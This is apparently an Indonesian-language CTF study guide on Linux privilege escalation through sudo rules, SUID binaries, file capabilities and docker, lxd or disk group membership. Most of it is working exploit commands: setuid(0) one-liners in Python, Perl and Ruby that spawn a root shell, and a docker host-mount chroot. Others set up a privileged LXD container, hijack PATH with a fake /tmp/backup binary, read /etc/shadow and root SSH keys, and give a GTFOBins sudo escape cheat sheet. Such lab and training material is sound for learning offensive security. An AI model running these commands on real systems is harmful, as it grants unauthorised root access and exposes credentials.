/usr/bin/ruby2.7 = cap_setuid+ep
/usr/bin/vim = cap_dac_read_search+ep
/usr/bin/tar = cap_dac_read_search+ep
/usr/bin/tcpdump = cap_net_raw+eip
```

---

# 4.2.2 🧩 Capability Flags

Contoh:

```text
cap_setuid+ep
```

dibaca sebagai:

```text
e = effective
p = permitted
```

Contoh:

```text
cap_net_raw+eip
```

berarti:

```text
e = effective
i = inheritable
p = permitted
```

---

# 4.3 🚨 Dangerous Capabilities

|Capability|Fungsi|Potensi impact|
|---|---|---|
|`cap_setuid`|Set UID|🔥 Sangat tinggi|
|`cap_setgid`|Set GID|🔥 Tinggi|
|`cap_dac_override`|Bypass DAC checks|🔥 Sangat tinggi|
|`cap_dac_read_search`|Bypass read/search DAC checks|🔥 Tinggi|
|`cap_sys_admin`|Beragam operasi administratif|☠️ Sangat tinggi|
|`cap_sys_ptrace`|Trace process|🔥 Tinggi|
|`cap_chown`|Change ownership|🟠 Tinggi|
|`cap_fowner`|Bypass beberapa owner checks|🟠 Tinggi|
|`cap_net_raw`|Raw networking|🟡 Biasanya bukan direct root|
|`cap_net_bind_service`|Bind privileged ports|🟢 Biasanya low impact untuk LPE|

### ⚠️ Important

Jangan menyimpulkan:

```text
cap_net_raw = root
```

Tidak.

Ini capability tertentu dengan capability-specific impact.

---

# 4.4 💥 `cap_setuid`

Ini salah satu capability paling penting di CTF.

Misalnya:

```bash
# Check
getcap /usr/bin/python3
```

Output:

```text
/usr/bin/python3 = cap_setuid+ep
```

Artinya Python process dapat menggunakan capability untuk mengubah UID dalam kondisi yang sesuai.

Exploit:

```bash
# Set UID to 0
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Verifikasi:

```bash
# Check identity
id
```

Expected:

```text
uid=0(root)
```

---

# 4.4.1 🐍 Perl

```bash
# Check capability
getcap /usr/bin/perl
```

Jika:

```text
/usr/bin/perl = cap_setuid+ep
```

maka:

```bash
# Change UID to root
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash"'
```

Verifikasi:

```bash
id
```

---

# 4.4.2 💎 Ruby

```bash
# Set UID 0
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

---

# 4.5 📖 `cap_dac_read_search`

Misalnya:

```text
/usr/bin/tar = cap_dac_read_search+ep
```

Capability tersebut dapat memungkinkan bypass tertentu terhadap normal DAC read/search permissions.

Contoh primitive:

```bash
# Attempt to archive protected file
tar -cf /tmp/shadow.tar /etc/shadow
```

Kemudian:

```bash
# Extract
cd /tmp
tar -xf shadow.tar
```

---

## Vim scenario

Jika:

```text
/usr/bin/vim = cap_dac_read_search+ep
```

maka:

```bash
# Attempt protected file access
vim /etc/shadow
```

atau:

```bash
# Attempt protected key read
vim /root/.ssh/id_rsa
```

### Impact chain

```text
cap_dac_read_search
       ↓
read protected file
       ↓
credential
       ↓
credential reuse
       ↓
root
```

Ini berbeda dari:

```text
cap_setuid
       ↓
UID 0
```

---

# 4.6 💾 `cap_dac_override`

`cap_dac_override` sangat powerful karena berkaitan dengan bypass DAC checks.

Misalnya:

```text
/usr/bin/python3 = cap_dac_override+ep
```

Maka Python dapat menjadi tool untuk operasi file yang normalnya dilarang.

Contoh lab:

```bash
# Try reading protected file
python3 -c 'print(open("/etc/shadow").read())'
```

Atau jika write primitive tersedia:

```bash
# Open a protected file for writing
python3 -c 'open("/path/to/protected/file","a").write("TEST\n")'
```

### ⚠️ Jangan menganggap:

```text
cap_dac_override = root shell
```

Capability tersebut adalah file access primitive.

Untuk menjadi root:

```text
read credential
OR
write privileged config
OR
modify executable
```

tergantung target.

---

# 4.7 🌳 Capability Decision Tree

```text
[getcap -r /]
        │
        ▼
   Ada capability?
        │
    ┌───┴────┐
    │        │
   YES       NO
    │        │
    ▼        ▼
[ANALYZE]   SUID
    │
 ┌──┼──────────────────────────────┐
 │  │               │              │
 ▼  ▼               ▼              ▼
SETUID  DAC_READ   DAC_OVERRIDE   SYS_ADMIN
 │        │             │              │
 ▼        ▼             ▼              ▼
UID 0   SHADOW/KEY   WRITE FILES    complex
 │        │             │              │
 ▼        ▼             ▼              ▼
ROOT    CREDS       PRIV CONFIG    namespace/
                                   mount/etc.
```

---

# 🐳 BAGIAN 5 — SPECIAL GROUP ABUSE

## 5.1 🐳 Docker Group

Check:

```bash
# Check Docker group membership
id | grep docker

# Or
groups | grep docker
```

Misalnya:

```text
groups=1001(alice),999(docker)
```

### Kenapa sangat berbahaya?

Jika user dapat mengontrol Docker daemon:

```text
docker daemon
     ↓
host filesystem mount
     ↓
host-level access
```

---

## Exploit

```bash
# Mount host filesystem
docker run \
  -v /:/mnt \
  --rm \
  -it \
  alpine \
  chroot /mnt sh
```

Breakdown:

```text
-v /:/mnt
    ↓
host /
    ↓
container /mnt

--rm
    ↓
remove container afterwards

-it
    ↓
interactive terminal

chroot /mnt
    ↓
gunakan host filesystem sebagai /
```

Verifikasi:

```bash
# Check identity
whoami
id
```

---

## Read root flag

```bash
# Example CTF flag
cat /root/root.txt
```

---

# 5.2 🦎 LXD/LXC

Check:

```bash
# Check LXD group
id | grep -E 'lxd|lxc'
```

Dalam environment tertentu, access ke LXD daemon dapat digunakan untuk membuat privileged container dan mount host filesystem.

---

## Builder

Attacker:

```bash
# Clone Alpine builder used in traditional labs
git clone https://github.com/saghul/lxd-alpine-builder.git

# Enter directory
cd lxd-alpine-builder

# Build image
./build-alpine
```

Serve:

```bash
# HTTP server
python3 -m http.server 8000
```

Target:

```bash
# Download image
wget http://$PARROT_IP:8000/alpine-v3.xx-x86_64.tar.gz
```

Import:

```bash
# Import image
lxc image import alpine-v3.xx-x86_64.tar.gz \
    --alias privesc
```

Create:

```bash
# Create privileged container
lxc init privesc pwn \
    -c security.privileged=true
```

Mount host:

```bash
# Mount host root into container
lxc config device add pwn hostroot disk \
    source=/ \
    path=/mnt/root \
    recursive=true
```

Start:

```bash
# Start container
lxc start pwn
```

Exec:

```bash
# Enter container
lxc exec pwn /bin/sh
```

Host filesystem:

```bash
# Inspect host root
ls /mnt/root/root
```

---

# 5.3 💽 Disk Group

Check:

```bash
# Check disk group
id | grep disk
```

Cari block devices:

```bash
# List disks/partitions
lsblk

# Check mounted filesystems
df -h
```

Contoh primitive:

```bash
# Inspect filesystem metadata
debugfs /dev/sda1
```

Di `debugfs`:

```text
debugfs: ls
```

Pada filesystem/ext environment yang sesuai, privileged disk access dapat menjadi direct route ke filesystem data.

### ⚠️ Jangan menganggap:

```text
disk group
=
semua member otomatis root
```

Impact tergantung:

```text
device
partition
filesystem
mount state
read/write access
```

---

# 🧪 BAGIAN 6 — FULL CTF WALKTHROUGH

# 6.1 🐍 SCENARIO A — `sudo python3 NOPASSWD`

## Initial shell

```text
alice@target:/home/alice$
```

---

## Step 1 — Identity

```bash
# Check current user
id
```

Output:

```text
uid=1001(alice) gid=1001(alice) groups=1001(alice)
```

---

## Step 2 — sudo

```bash
# Enumerate sudo permissions
sudo -l
```

Output:

```text
User alice may run the following commands:
    (root) NOPASSWD: /usr/bin/python3
```

Interpretation:

```text
alice
  ↓
can execute
  ↓
/usr/bin/python3
  ↓
as root
  ↓
without password
```

---

## Step 3 — Exploit

```bash
# Spawn a shell through Python
sudo /usr/bin/python3 -c \
'import os; os.system("/bin/bash")'
```

---

## Step 4 — Verify

```bash
# Verify username
whoami

# Verify numeric UID
id -u

# Show complete identity
id
```

Expected:

```text
root
0
uid=0(root) gid=0(root) groups=0(root)
```

---

## Step 5 — Flag

```bash
# HTB-style flag
cat /root/root.txt
```

### Mental model

```text
sudo -l
   ↓
NOPASSWD
   ↓
Python
   ↓
GTFOBins-style command execution
   ↓
root
```

---

# 6.2 🛣️ SCENARIO B — Custom SUID + PATH Injection

Initial:

```text
bob@target:~$
```

---

## Step 1 — Identity

```bash
# Check identity
id
```

Output:

```text
uid=1001(bob) gid=1001(bob) groups=1001(bob)
```

---

## Step 2 — Search SUID

```bash
# Find SUID files
find / -perm -4000 -type f 2>/dev/null
```

Output:

```text
/usr/bin/passwd
/usr/bin/su
/usr/bin/sudo
/opt/backup
```

Interesting:

```text
/opt/backup
```

---

## Step 3 — Permission

```bash
# Inspect binary
ls -la /opt/backup
```

Output:

```text
-rwsr-xr-x 1 root root 17384 /opt/backup
```

Red flag:

```text
root-owned
+
SUID
+
custom location
```

---

## Step 4 — File

```bash
# Identify binary
file /opt/backup
```

Output:

```text
ELF 64-bit LSB pie executable, x86-64
```

---

## Step 5 — Strings

```bash
# Search embedded strings
strings /opt/backup
```

Interesting:

```text
backup
tar
Starting backup...
```

---

## Step 6 — Trace

```bash
# Trace exec behavior
strace /opt/backup 2>&1 | grep execve
```

Potential output:

```text
execve("/opt/backup", [...], [...]) = 0
execve("backup", ["backup"], [...]) = 0
```

This is significant.

The program invokes:

```text
backup
```

without an absolute path.

---

## Step 7 — Fake executable

```bash
# Create malicious replacement
cat > /tmp/backup <<'EOF'
#!/bin/bash
/bin/bash -p
EOF
```

Make executable:

```bash
# Set execute bit
chmod +x /tmp/backup
```

---

## Step 8 — PATH

```bash
# Place /tmp before normal PATH entries
export PATH=/tmp:$PATH
```

Check:

```bash
# Confirm which backup is found first
command -v backup
```

Expected:

```text
/tmp/backup
```

---

## Step 9 — Execute SUID binary

```bash
# Run vulnerable SUID binary
/opt/backup
```

---

## Step 10 — Verify

```bash
# Check current identity
id
```

Expected:

```text
uid=1001(bob) gid=1001(bob) euid=0(root)
```

Then:

```bash
# Check username
whoami
```

Expected:

```text
root
```

---

# 6.3 ⚡ SCENARIO C — `cap_setuid` pada Perl

Initial:

```text
charlie@target:~$
```

---

## Step 1

```bash
# Identity
id
```

Output:

```text
uid=1001(charlie) gid=1001(charlie)
```

---

## Step 2

```bash
# Enumerate capabilities
getcap -r / 2>/dev/null
```

Output:

```text
/usr/bin/perl = cap_setuid+ep
```

---

## Step 3 — Understand finding

```text
Perl
+
CAP_SETUID
+
effective/permitted
```

Potential:

```text
setuid(0)
```

---

## Step 4 — Exploit

```bash
# Set UID to 0 and spawn shell
perl -e \
'use POSIX qw(setuid); setuid(0); exec "/bin/bash"'
```

---

## Step 5 — Verify

```bash
# Verify
id
whoami
id -u
```

Expected:

```text
uid=0(root)
root
0
```

---

## Step 6 — Flag

```bash
# Capture CTF flag
cat /root/root.txt
```

---

# 🔧 BAGIAN 7 — COMMON ERRORS & TROUBLESHOOTING

|Error / Situasi|Penyebab|Solusi|
|---|---|---|
|`sudo -l: Sorry, user may not run sudo`|User tidak punya sudo rule|Lanjut SUID/capabilities|
|`sudo: a password is required`|Rule butuh password|Cari credential / jalur lain|
|`sudo` meminta TTY|Shell terlalu primitive|Upgrade TTY|
|`bash -p` tidak menghasilkan root|Binary tidak benar-benar SUID root|Cek `ls -la`, owner, dan EUID|
|SUID `S` besar|Execute owner bit tidak aktif|Jangan anggap usable sebagai executable|
|`getcap: command not found`|Utility tidak ada PATH|Coba `/sbin/getcap`|
|`python3 os.setuid(0)` gagal|Capability tidak ada/efektif|Re-check `getcap`|
|`LD_PRELOAD` tidak bekerja|Environment disanitasi|Cek sudoers/env handling|
|Find SUID sangat lama|Root filesystem besar|Batasi `/usr /bin /sbin /opt`|
|`docker: permission denied`|Tidak punya daemon access|Cek group/socket|
|LXC image import gagal|Image/runtime mismatch|Validasi LXD version dan image|
|PATH injection gagal|Program memakai absolute path|Gunakan `strace`|
|PATH injection gagal|PATH tidak dikontrol process|Cek environment sebenarnya|
|`ltrace: command not found`|Tool tidak terinstall|Gunakan `strace`/`strings`|
|`strace: Operation not permitted`|Tracing dibatasi|Gunakan static inspection|
|SUID custom binary crash|Input/argument salah|Mulai dengan `--help`/normal execution|
|`sudo vim` tidak menghasilkan shell|Rule tidak sama dengan asumsi|Baca `sudo -l` exact|
|`sudo python3` tidak dapat shell|Binary/path berbeda|Gunakan exact allowed path|
|`getcap` tidak menunjukkan output|Tidak ada file capability|Lanjut SUID/cron/etc|
|Capability ada tetapi tidak root|Capability bukan `cap_setuid`|Analisis primitive capability tersebut|

---

# 🧠 BAGIAN 8 — GOLDEN RULES

## 1. 🔥 `sudo -l` adalah command wajib pertama

```bash
# First privilege check
sudo -l
```

---

## 2. 🟣 NOPASSWD = prioritas tinggi

```text
NOPASSWD
  ↓
No credential barrier
  ↓
Check allowed binary
  ↓
GTFOBins
```

---

## 3. 📚 Selalu cek GTFOBins

```text
Binary
 ↓
GTFOBins
 ↓
Correct section
 ↓
Adapt
 ↓
Test
```

---

## 4. 🔐 `s` dan `S` tidak sama

```text
s
=
SUID + execute

S
=
SUID + no owner execute
```

---

## 5. 🧩 Jangan lupakan capabilities

```bash
# Always check
getcap -r / 2>/dev/null
```

Karena:

```text
No interesting SUID
+
Interesting capability
=
possible PrivEsc
```

---

## 6. ⚡ `cap_setuid` sangat penting

Jika interpreter:

```text
python
perl
ruby
```

memiliki:

```text
cap_setuid+ep
```

candidate-nya sangat kuat.

---

## 7. 🐳 Docker group dapat root-equivalent access

Tetapi:

```text
docker group
```

berarti:

```text
access Docker daemon
```

dan impact berasal dari:

```text
daemon control
```

bukan sekadar nama group.

---

## 8. ✅ Selalu verify

Setelah exploit:

```bash
# Check username
whoami

# Check UID
id -u

# Check full credentials
id
```

---

## 9. 🐚 `-p` penting pada shell tertentu

Misalnya SUID bash:

```bash
# Preserve privileged mode
/bin/bash -p
```

---

## 10. 🧪 Custom binary = jangan langsung exploit

Gunakan:

```bash
# File type
file /path/to/binary

# Strings
strings /path/to/binary

# Library tracing
ltrace /path/to/binary

# Syscall tracing
strace /path/to/binary 2>&1
```

---

## 11. 🛣️ PATH hijacking sering terlewat

Cari:

```text
command
```

vs:

```text
/path/to/command
```

Perbedaannya sangat penting.

---

## 12. 🔁 Jangan terjebak satu vector

Jika:

```text
sudo
```

gagal:

```text
SUID
 ↓
Capabilities
 ↓
Cron
 ↓
Credentials
 ↓
Writable files
 ↓
Services
 ↓
Docker/LXD/NFS
```

---

# ⚡ BAGIAN 9 — CHEATSHEET

## Enumeration

```bash
# Current identity
id

# Current username
whoami

# Sudo rules
sudo -l

# SUID
find / -perm -4000 -type f 2>/dev/null

# SGID
find / -perm -2000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null
```

---

## Sudo

```bash
# Root shell
sudo -i

# Root bash
sudo /bin/bash

# Python
sudo python3 -c 'import os; os.system("/bin/bash")'

# Python interactive
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'

# Find
sudo find . -exec /bin/bash \; -quit

# Vim
sudo vim -c ':!/bin/bash'

# Less
sudo less /etc/passwd
# Inside less:
# !/bin/bash

# AWK
sudo awk 'BEGIN {system("/bin/bash")}'
```

---

## SUID

```bash
# SUID bash
/bin/bash -p

# SUID Python
python3 -c 'import os; os.execl("/bin/sh","sh","-p")'

# SUID find
find . -exec /bin/sh -p \; -quit

# Inspect SUID binary
ls -la /path/to/binary

# Static analysis
strings /path/to/binary

# Syscall tracing
strace /path/to/binary 2>&1
```

---

## Capabilities

```bash
# Enumerate
getcap -r / 2>/dev/null

# Python cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl cap_setuid
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash"'

# Ruby cap_setuid
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

---

## Docker

```bash
# Check membership
id | grep docker

# Mount host root
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

## Root verification

```bash
# Username
whoami

# Numeric UID
id -u

# Complete identity
id
```

---

# 🌳 BAGIAN 10 — MASTER DECISION TREE

```text
                    [DAPAT SHELL]
                         │
                         ▼
                  [id / whoami]
                         │
              ┌──────────┼──────────┐
              │          │          │
              ▼          ▼          ▼
           docker       lxd        disk
              │          │          │
              └──────────┼──────────┘
                         │
                         ▼
                     [sudo -l]
                         │
        ┌────────────────┼──────────────────┐
        │                │                  │
        ▼                ▼                  ▼
    NOPASSWD          Wildcard           env_keep
        │                │                  │
        ▼                ▼                  ▼
    GTFOBins         Analyze args       LD_PRELOAD
        │                │                  │
        └────────────────┼──────────────────┘
                         │
                         ▼
                    [SUID SCAN]
                         │
              ┌──────────┼─────────────┐
              │          │             │
              ▼          ▼             ▼
         Interpreter  GTFOBins      Custom
              │          │             │
              ▼          ▼             ▼
           exploit    exploit      strings
                                      │
                                      ▼
                                   strace
                                      │
                                      ▼
                                   PATH?
                                      │
                         ┌────────────┴─────────────┐
                         │                          │
                        YES                         NO
                         │                          │
                         ▼                          ▼
                   PATH Hijack                library/input
                                                     │
                                                     ▼
                                             [CAPABILITIES]
                                                     │
                          ┌──────────────────────────┼───────────────────┐
                          │                          │                   │
                          ▼                          ▼                   ▼
                       setuid                  dac_read             dac_override
                          │                          │                   │
                          ▼                          ▼                   ▼
                       UID 0                  creds/files          write primitive
                          │                          │                   │
                          └──────────────────────────┼───────────────────┘
                                                     │
                                                     ▼
                                                [ROOT?]
                                                     │
                                         ┌───────────┴───────────┐
                                         │                       │
                                        YES                      NO
                                         │                       │
                                         ▼                       ▼
                                      VERIFY              File 44 Linux PrivEsc
                                         │
                                         ▼
                                    /root/root.txt
```

---

# 🚦 BAGIAN 11 — 30-SECOND TRIAGE

Saat baru mendapat shell:

```bash
# 1 — Who am I?
id

# 2 — Sudo?
sudo -l

# 3 — SUID?
find / -perm -4000 -type f 2>/dev/null

# 4 — Capabilities?
getcap -r / 2>/dev/null

# 5 — Groups?
groups
```

Kemudian secara mental:

```text
SUDO?
  ↓
SUID?
  ↓
CAPABILITY?
  ↓
GROUP?
  ↓
CUSTOM BINARY?
  ↓
GTFOBins?
```

---

# 🧠 BAGIAN 12 — MASTER MENTAL MODEL

Jangan menghafal:

```text
30 exploit commands
```

Hafalkan primitive:

```text
SUDO
 │
 ├── EXECUTE
 ├── READ
 └── WRITE

SUID
 │
 ├── EUID CHANGE
 ├── EXECUTE
 ├── PATH
 └── LIBRARY

CAPABILITIES
 │
 ├── SETUID
 ├── DAC READ
 ├── DAC WRITE
 ├── ADMIN
 └── PTRACE

SPECIAL GROUP
 │
 ├── DOCKER
 ├── LXD
 ├── DISK
 └── ADM
```

---

# 🔗 BAGIAN 13 — CROSS-WORKFLOW

## ← File 44 — Linux PrivEsc General

```text
./[🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc)
```

File 44:

```text
BROAD ENUMERATION
```

File 47:

```text
DEEP DIVE
├── sudo
├── SUID
└── capabilities
```

Alur:

```text
File 44
   ↓
discover vector
   ↓
File 47
   ↓
deep-dive vector
```

---

## ← File 46 — Windows Token Impersonation

```text
./[🎫 46 — Token Impersonation Workflow](/docs/token-impersonation)
```

Perbandingan:

```text
WINDOWS
Access Token
   ↓
SeImpersonate
   ↓
Token abuse
   ↓
SYSTEM


LINUX
UID/EUID
   ↓
sudo / SUID / capabilities
   ↓
Privilege abuse
   ↓
root
```

---

## → File 48 — Binary Analysis

```text
./[🔬 48 — Binary Analysis Workflow](/docs/binary-analysis)
```

Ketika File 47 menemukan:

```text
custom SUID binary
```

workflow dilanjutkan:

```text
SUID
 ↓
file
 ↓
strings
 ↓
strace/ltrace
 ↓
reverse engineering
```

---

# 🧹 BAGIAN 14 — POST-EXPLOIT CLEANUP

Setelah CTF/lab:

```bash
# Remove temporary files
rm -f /tmp/evil.c
rm -f /tmp/evil.so
rm -f /tmp/backup
rm -f /tmp/shell.sh
```

Jika mengubah environment:

```bash
# Restore PATH approximately
export PATH="$(printf '%s' "$PATH" | sed 's#^/tmp:##')"
```

Jika membuat test SUID file:

```bash
# Remove temporary SUID binary
rm -f /tmp/rootbash
```

Untuk challenge:

```text
[ ] payload removed
[ ] fake binary removed
[ ] temporary source removed
[ ] temporary output removed
[ ] PATH restored
```

---

# 🏆 BAGIAN 15 — FINAL CHECKLIST

```text
╔═══════════════════════════════════════════════╗
║      LINUX SUDO/SUID/CAPABILITIES CHECK      ║
╚═══════════════════════════════════════════════╝
```

## 👤 Identity

```text
[ ] id
[ ] whoami
[ ] groups
[ ] UID
[ ] GID
```

## 🛡️ Sudo

```text
[ ] sudo -l
[ ] NOPASSWD
[ ] ALL
[ ] GTFOBins
[ ] wildcard
[ ] env_keep
[ ] LD_PRELOAD
[ ] sudo version
```

## 🔐 SUID/SGID

```text
[ ] SUID scan
[ ] SGID scan
[ ] owner checked
[ ] s/S understood
[ ] GTFOBins
[ ] interpreter
[ ] custom binary
[ ] strings
[ ] ltrace
[ ] strace
[ ] PATH injection
[ ] library loading
```

## 🧩 Capabilities

```text
[ ] getcap -r /
[ ] cap_setuid
[ ] cap_setgid
[ ] cap_dac_override
[ ] cap_dac_read_search
[ ] cap_sys_admin
[ ] cap_sys_ptrace
[ ] cap_chown
[ ] cap_fowner
```

## 👥 Groups

```text
[ ] sudo
[ ] docker
[ ] lxd/lxc
[ ] disk
[ ] shadow
[ ] adm
[ ] interesting custom group
```

## ✅ Verification

```text
[ ] whoami
[ ] id
[ ] id -u
[ ] EUID checked
[ ] root flag captured
```

---

# 🧠 BAGIAN 16 — FINAL GOLDEN FLOW

```text
                 LOW PRIV SHELL
                       │
                       ▼
                  WHO AM I?
                       │
                       ▼
                    sudo -l
                       │
          ┌────────────┼────────────┐
          │            │            │
          ▼            ▼            ▼
       SUDO           SUID         CAPS
          │            │            │
          ▼            ▼            ▼
      GTFOBins     GTFOBins      capability
          │            │            │
          ▼            ▼            ▼
      command      EUID abuse    primitive
          │            │            │
          └────────────┼────────────┘
                       │
                       ▼
                  ROOT ACCESS?
                       │
                  ┌────┴────┐
                  │         │
                 YES        NO
                  │         │
                  ▼         ▼
               VERIFY    GROUPS
                  │         │
                  ▼         ▼
                FLAG   docker/lxd/disk
                            │
                            ▼
                       CUSTOM BINARY
                            │
                            ▼
                         strace
                            │
                            ▼
                       PATH/LIBRARY
                            │
                            ▼
                         FILE 44
```

---

# 🏁 BAGIAN 17 — THE ONE-LINE MEMORY

```text
SHELL → id → sudo -l → GTFOBins → SUID → custom binary → strace/strings → getcap → groups → ROOT → VERIFY
```

---

# ⭐ BAGIAN 18 — THE REAL SKILL

Skill sebenarnya bukan:

```text
"hafal sudo python3"
```

atau:

```text
"hafal bash -p"
```

Tetapi memahami security primitive:

```text
WHO?
 ↓
UID / EUID / GID

WHAT?
 ↓
sudo / SUID / capability / group

CONTROL?
 ↓
Can I execute?
Can I read?
Can I write?
Can I influence PATH?
Can I influence library loading?
Can I influence arguments?

IMPACT?
 ↓
Can that control cross the root boundary?
```

---

# 🎯 MASTER EXAMPLES

## Example A

```text
sudo -l
    ↓
NOPASSWD python3
    ↓
GTFOBins
    ↓
command execution
    ↓
root
```

## Example B

```text
SUID custom binary
    ↓
strace
    ↓
execve("backup")
    ↓
PATH injection
    ↓
root
```

## Example C

```text
getcap
    ↓
perl = cap_setuid+ep
    ↓
setuid(0)
    ↓
root
```

---

# 🧠 FINAL RULE

Setiap kali mendapatkan low-privilege shell Linux, pertanyaan pertama bukan:

```text
"Exploit apa yang harus saya download?"
```

Pertanyaan yang benar:

```text
"Privilege apa yang sudah dipercayakan
sistem kepada saya, dan apa yang dapat saya kontrol
untuk melewati boundary menuju UID 0?"
```

Kemudian:

```text
ENUMERATE
    ↓
UNDERSTAND
    ↓
VALIDATE
    ↓
EXPLOIT
    ↓
VERIFY
```

Itulah workflow inti Linux:

```text
sudo
+
SUID
+
capabilities
+
GTFOBins
+
custom binary analysis
=
core Linux PrivEsc muscle memory
```

---

# [🐧 47 — Sudo, SUID & Capabilities Workflow](/docs/sudo-suid-capabilities) — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Ini adalah workflow **setelah** kamu sudah punya low-privilege shell di target Linux.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun. Satu kali di awal sesi.
export TARGET_IP="10.10.11.200"    # IP target (referensi)
export LHOST="10.10.14.5"          # IP tun0 kamu
export LPORT="4444"
export CURRENT_USER=$(whoami)

# Buat folder loot
mkdir -p ~/privesc_loot/{creds,binaries,output}
cd ~/privesc_loot

echo "[*] User: $CURRENT_USER | Target: $TARGET_IP"
echo "[*] Mulai Linux PrivEsc — Sudo/SUID/Capabilities"
```

**Output yang diharapkan:**

text

```
[*] User: www-data | Target: 10.10.11.200
[*] Mulai Linux PrivEsc — Sudo/SUID/Capabilities
```

---

## ═══════════════════════════════════════

## FASE 0: 30-SECOND TRIAGE — SIAPA KAMU?

## ═══════════════════════════════════════

> **Tujuan:** Identifikasi context sebelum apapun. 5 command ini wajib dijalankan pertama kali.

### Langkah 0.1 — Identity Check

Bash

```
# Command 1: Full identity
id

# Command 2: Username saja
whoami

# Command 3: Groups yang kamu ikuti
groups

# Command 4: Cek home directory dan environment
env | grep -E "(HOME|USER|SHELL|PATH)"

# Command 5: OS version (untuk cari kernel exploit nanti)
uname -a
cat /etc/os-release 2>/dev/null || cat /etc/issue
```

**OUTPUT BERHASIL ✅ — User biasa, tidak ada grup menarik:**

text

```
uid=1001(alice) gid=1001(alice) groups=1001(alice)
alice
alice
```

➡️ **Tindakan:** Lanjut ke Langkah 0.2 (sudo check)

**OUTPUT BERHASIL ✅ — Ada grup menarik (PRIORITAS TINGGI!):**

text

```
uid=33(www-data) gid=33(www-data) groups=33(www-data),999(docker)
```

atau:

text

```
uid=1001(alice) gid=1001(alice) groups=1001(alice),27(sudo),1000(docker),117(lxd)
```

**Cara baca grup — tindakan langsung:**

|Group|Tindakan|
|---|---|
|`sudo`|→ Langsung ke **Fase 1** (sudo -l)|
|`docker`|→ **JACKPOT!** Langsung ke **Fase 5A** (Docker Escape)|
|`lxd` atau `lxc`|→ **JACKPOT!** Langsung ke **Fase 5B** (LXD Escape)|
|`disk`|→ Langsung ke **Fase 5C** (Disk Group Abuse)|
|`shadow`|→ `cat /etc/shadow` langsung!|
|`adm`|→ `cat /var/log/auth.log` cari credentials|

**OUTPUT ✅ — Sudah root:**

text

```
uid=0(root) gid=0(root) groups=0(root)
```

➡️ **Sudah root! Tidak perlu privesc.** Langsung ambil flag: `cat /root/root.txt`

---

### Langkah 0.2 — Shell Quality Check (WAJIB sebelum lanjut)

> Shell yang buruk menyebabkan sudo -l hang atau output tidak terbaca.

Bash

```
# Cek apakah shell sudah TTY proper
python3 -c 'import pty; pty.spawn("/bin/bash")' 2>/dev/null || \
python -c 'import pty; pty.spawn("/bin/bash")' 2>/dev/null || \
script -qc /bin/bash /dev/null

# Setelah spawn bash, set terminal
export TERM=xterm
stty rows 50 cols 200
```

**OUTPUT BERHASIL ✅:**

text

```
alice@target:/var/www/html$
```

➡️ Shell sudah proper. Lanjut ke **Fase 1**.

**OUTPUT GAGAL ❌ — sudo -l hang/tidak respond:**

text

```
[hanging...]
```

➡️ Shell belum TTY. Upgrade dulu. Atau gunakan flag `-S` untuk pipe password:

Bash

```
# Alternative tanpa TTY
sudo -l 2>/dev/null
```

---

## ═══════════════════════════════════════

## FASE 1: SUDO ENUMERATION

## ═══════════════════════════════════════

> **Tujuan:** Ini adalah PRIORITAS TERTINGGI. Sudo misconfiguration = jalan tercepat ke root.

### Langkah 1.1 — Cek Sudo Rules

Bash

```
# Command utama
sudo -l

# Jika diminta password dan kamu tidak tahu:
sudo -l 2>&1 | head -20

# Cek sudo version (untuk CVE check)
sudo --version
```

**OUTPUT BERHASIL ✅ — NOPASSWD (JACKPOT!):**

text

```
User alice may run the following commands on target:
    (ALL) NOPASSWD: /usr/bin/python3
```

➡️ **Langsung ke Langkah 1.2A**

**OUTPUT BERHASIL ✅ — Binary spesifik dengan password:**

text

```
User alice may run the following commands on target:
    (root) /usr/bin/vim
```

➡️ Butuh password. Cek apakah kamu sudah tahu password user ini dari fase sebelumnya.  
➡️ Jika ada password → jalankan `sudo vim` → **Langkah 1.2C**  
➡️ Jika tidak ada password → skip ke **Fase 2 (SUID)**

**OUTPUT BERHASIL ✅ — ALL commands:**

text

```
User alice may run the following commands on target:
    (ALL : ALL) ALL
```

➡️ User bisa sudo apapun! Jalankan:

Bash

```
sudo -i           # Interactive root shell
# atau
sudo /bin/bash    # Root bash
```

**OUTPUT BERHASIL ✅ — Wildcard:**

text

```
    (root) /usr/bin/zip *
    (root) /opt/backup *
```

➡️ **Langkah 1.2D** — Wildcard injection analysis

**OUTPUT BERHASIL ✅ — env_keep:**

text

```
Defaults env_keep += "LD_PRELOAD"
```

➡️ **Langkah 1.2E** — LD_PRELOAD abuse

**OUTPUT GAGAL ❌ — Tidak ada sudo:**

text

```
Sorry, user alice may not run sudo on target.
```

➡️ User tidak punya sudo. Lanjut ke **Fase 2 (SUID)**

**OUTPUT GAGAL ❌ — sudo tidak tersedia:**

text

```
sudo: command not found
```

➡️ Sudo tidak terinstall. Lanjut ke **Fase 2 (SUID)**

---

### Langkah 1.2A — Exploit NOPASSWD Binary (GTFOBins)

> Setelah dapat binary dengan NOPASSWD, cek di GTFOBins: [https://gtfobins.github.io](https://gtfobins.github.io/)

Bash

```
# ============ PYTHON / PYTHON3 ============
sudo python3 -c 'import os; os.system("/bin/bash")'
# Atau lebih interactive:
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'

# ============ PYTHON DENGAN PATH SPESIFIK ============
# PENTING: Gunakan EXACT path yang tertera di sudo -l!
sudo /usr/bin/python3 -c 'import os; os.system("/bin/bash")'

# ============ PERL ============
sudo perl -e 'exec "/bin/bash"'

# ============ RUBY ============
sudo ruby -e 'exec "/bin/bash"'

# ============ PHP ============
sudo php -r 'system("/bin/bash");'

# ============ NODE ============
sudo node -e 'require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})'

# ============ LUA ============
sudo lua -e 'os.execute("/bin/bash")'

# ============ AWK ============
